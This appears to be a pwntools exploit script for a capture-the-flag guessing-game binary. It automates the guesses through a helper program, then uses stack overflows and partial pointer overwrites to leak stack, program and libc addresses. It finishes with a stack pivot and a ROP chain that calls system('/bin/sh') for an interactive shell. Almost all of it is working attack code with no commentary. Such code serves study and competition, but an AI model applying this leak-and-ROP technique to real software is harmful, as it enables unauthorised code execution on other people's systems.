io = start()

def guesser():
  io.readuntil(b'No): ')
  io.sendline(b'1')

  na = False
  while True:
    if not na:
      io.readuntil(b'Attempt')
    na = False
    vars = [int(i) for i in os.popen("./guess").read().split("\n")[:-1]]
    resp = vars[0]
    io.readuntil(b'100')
    io.sendline(str(resp).encode())
    res = io.readline()
    print(b'received 1: '+res)
    if(b'Nope' in res):
      continue
    res = io.readline()
    print(b'received 2: '+res)

    if(b'Nope' in res):
      na = True
      continue
    if(b'not a number' in res):
      sys.exit(1)
    if(b'morning' in res):
      return

#
# 1 - fp
#

guesser()
io.send(b'A'*0x100+b'\xf0') # brute 16 to _start
leak_fp_arr = io.readline().split(b'A'*0x100)
print(leak_fp_arr)
leak_fp = u64((leak_fp_arr[-1][:6]).ljust(8, b"\x00"))
print(f'leak fp: 0x{leak_fp:x}')

#
# 2 - leak ret to main
#
guesser()
io.send(b'A'*0x108+b'\xc0')
leak_main = u64((io.readline().split(b'A'*0x108)[-1][:6]).ljust(8, b"\x00"))
print(f'ret from ask: 0x{leak_main:x}')
exe.address = leak_main - exe.sym.main - 222
print(f'got puts: 0x{exe.got.puts:x}')
print(f'sym puts: 0x{exe.sym.puts:x}')

#
# 3 - loop main with ret set
#

io.readuntil(b'morning?')
io.send(b'A'*0x100+p64(leak_fp-0xf0)+p64(exe.sym._start)+p64(0xdeadbeefdeadbeef))
io.readline()

#
# 4 - go locate the buffer by printf
#

fix = int(sys.argv[1], 16)
print(f'try to find our buffer with offset: {hex(fix)}') # -0x218

guesser()
io.send(b'A'*0x80+p64(exe.sym._start)*0x10+p64(leak_fp+fix)+p64(exe.address + 0x13a7))
io.readuntil(b'person')
leak_stdin = u64((io.readuntil(b'person').split(b' to ')[-1][:6]).ljust(8, b"\x00"))
print(f'leak stdin: {hex(leak_stdin)}')
libc_base = leak_stdin - libc.sym._IO_2_1_stdin_
print(f'libc base: {hex(libc_base)}')

#
# 5 - stack pivot to allocate some space
#

libc.address = libc_base
rop = ROP(libc)
pop_rdi = rop.rdi.address
ret = rop.ret.address
binsh = next(libc.search(b'/bin/sh'))
payload = p64(pop_rdi)+p64(binsh)+p64(ret)+p64(libc.sym.system)
print(f'puts: {hex(libc.sym.puts)}')

guesser()
io.send(b'A'*0x80+p64(0xdeadbeef)+payload+b'B'*0x58+p64(leak_fp-0x3b0))

io.interactive()
